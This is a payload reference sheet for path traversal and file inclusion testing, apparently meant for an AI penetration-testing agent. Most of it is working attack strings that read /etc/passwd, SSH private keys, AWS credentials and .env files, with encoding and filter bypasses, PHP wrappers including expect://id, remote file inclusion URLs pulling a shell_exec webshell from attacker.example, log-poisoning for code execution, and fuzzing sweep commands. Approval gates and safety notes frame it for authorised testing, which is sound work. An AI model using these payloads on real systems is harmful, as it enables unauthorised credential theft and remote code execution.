# payloads — path-traversal-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Técnico_ Vulnerabilidades de Inclusão de Arquivos e Traversal.md` (Section 5: PAYLOADS / PROBES)

All probes read non-destructive files (`/etc/passwd`, `/etc/hostname`,
`c:/windows/win.ini`). Do NOT write to the filesystem or attempt RFI
shells without `destructive_testing: approved`.

---

## 1. Baseline — Known-Good Reference

Before traversal, confirm the endpoint reads the file you supply.
Request a legitimate file and capture the response length:

```
GET /view?file=report.pdf          → 200, size N
GET /view?file=doesnotexist        → 404 or different error page
```

The differential behaviour guides later probes.

---

## 2. Unix Classic Traversal

```
../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../etc/hostname
../../../../etc/issue
../../../../proc/self/environ            # env vars (reveals secrets)
../../../../proc/self/cmdline             # process command line
../../../../proc/1/cgroup                 # reveals container runtime
../../../../var/log/auth.log
../../../../root/.ssh/id_rsa              # if app runs as root
../../../../home/app/.aws/credentials     # IAM keys
```

## 3. Windows Classic Traversal

```
..\..\..\..\boot.ini
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\inetpub\logs\LogFiles\W3SVC1\
```

Windows accepts forward slashes too:

```
../../../../windows/win.ini
```

## 4. URL-Encoded Traversal

Single-encoded:

```
%2e%2e%2f%2e%2e%2fetc%2fpasswd                # ../../etc/passwd
%2e%2e/%2e%2e/etc/passwd
..%2fetc%2fpasswd
```

Double-encoded (when the app decodes twice before filtering):

```
%252e%252e%252fetc%252fpasswd
%25%32%65%25%32%65%25%32%66
```

## 5. Unicode / UTF-8 Overlong Encoding

```
%c0%ae%c0%ae/                                   # overlong . .
%e0%80%ae%e0%80%ae/
%u2216../                                        # Unicode backslash
```

Less common on modern servers but worth trying legacy IIS / old PHP.

## 6. Null-Byte Truncation (legacy PHP / C)

When the app appends an extension (`.jpg`, `.pdf`), terminate early:

```
../../../../etc/passwd%00.jpg
../../../../etc/passwd\x00.jpg
```

Modern PHP (>= 5.3.4) prevents this — still try on legacy apps.

## 7. Recursive / Filter-Bypass Variants

```
....//....//etc/passwd            # some filters strip "../" once
....\\....\\etc\\passwd
..///..///etc/passwd              # multiple slashes
./././etc/passwd
/var/www/../../etc/passwd         # absolute path with traversal
```

## 8. Protocol Wrapper (PHP)

PHP-specific wrappers that read files via a URL-like syntax:

```
file:///etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=../config.php
php://filter/read=convert.iconv.UTF-8.UTF-16/resource=/etc/passwd
php://input                                      # read POST body
expect://id                                      # GATED — executes command
data://text/plain;base64,ZGVidWc=
```

The `base64-encode` filter is crucial when the target file contains
characters that would break the HTTP response (binary, XML-hostile).

## 9. Absolute Paths

Some applications don't expect absolute paths:

```
/etc/passwd
\\etc\\passwd
/var/log/apache2/access.log
C:\windows\win.ini
```

## 10. Application-Source File Read

After access to any file is confirmed, target application source:

```
../../../../var/www/html/index.php
../../../../var/www/html/config/database.yml
../../../../app/.env
../../../../app/application.properties
../../../../app/app.py
../../../../WEB-INF/web.xml
../../../../WEB-INF/classes/application.yml
```

Source files often contain hardcoded credentials — see also
`secrets-in-code-hunter`.

---

## 11. Remote File Inclusion (RFI)

For PHP-style `include` / `require` statements that allow remote URLs
(`allow_url_include = On`):

```
http://attacker.example/shell.txt
http://attacker.example/shell.txt?
//attacker.example/shell.txt
\\\\attacker.example\\share\\shell.txt

# Fragment trick to strip suffix
http://attacker.example/shell.txt%23
```

Host a text file at `attacker.example/shell.txt` containing:

```php
<?php echo shell_exec("id"); ?>
```

RFI with command execution is DESTRUCTIVE — gate behind
`destructive_testing: approved` and use a harmless probe first
(`<?php phpinfo(); ?>`).

---

## 12. Local File Inclusion (LFI) — Chaining for RCE

Not a direct payload — a sequence. When LFI + write-able path exists:

1. Write attacker-controlled content to a log file the PHP app will
   `include()`. E.g., poison `access.log` by making a request with a
   `User-Agent` that is PHP code.
2. Use LFI to include that log.

This is destructive — gate behind approval.

---

## Sweep Commands

```bash
# ffuf — fuzz a file parameter
ffuf -w lfi_payloads.txt:PAYLOAD \
     -u "https://target/view?file=PAYLOAD" \
     -mc 200,500 -fs 0

# wfuzz with a payload list
wfuzz -c \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "https://target/view?file=FUZZ" \
  --hc 404

# Nuclei LFI templates
nuclei -u "https://target/view?file=FUZZ" \
       -t ~/nuclei-templates/http/vulnerabilities/
```

---

## Signal Classification

| Response body snippet                              | Meaning                        |
|----------------------------------------------------|--------------------------------|
| `root:x:0:0:...` / `:/root:/bin/bash`              | `/etc/passwd` disclosed        |
| `[fonts]` / `[extensions]`                         | Windows `win.ini` disclosed    |
| `<?php` / `<?=`                                    | PHP source file disclosed      |
| `java -jar` / `MANIFEST.MF`                        | Jar / WAR internals disclosed  |
| `AWS_ACCESS_KEY_ID=` / `DATABASE_URL=`             | `.env` or config disclosed     |
| `...` identical to a legit-file response           | Traversal blocked / normalized |
| HTTP 400 "invalid path"                            | Filter active — try evasion    |

---

## Safety Notes

- Reading `/root/.ssh/id_rsa` from a system is exfiltration — confirm
  one readable sensitive file, record the finding, and stop. Do NOT
  read hundreds of files.
- Some apps write audit log entries for every file-read — expect
  detection during RFI probes.
- The `data://` and `expect://` wrappers execute code on the target.
  Gate `expect://id` behind `destructive_testing: approved`.
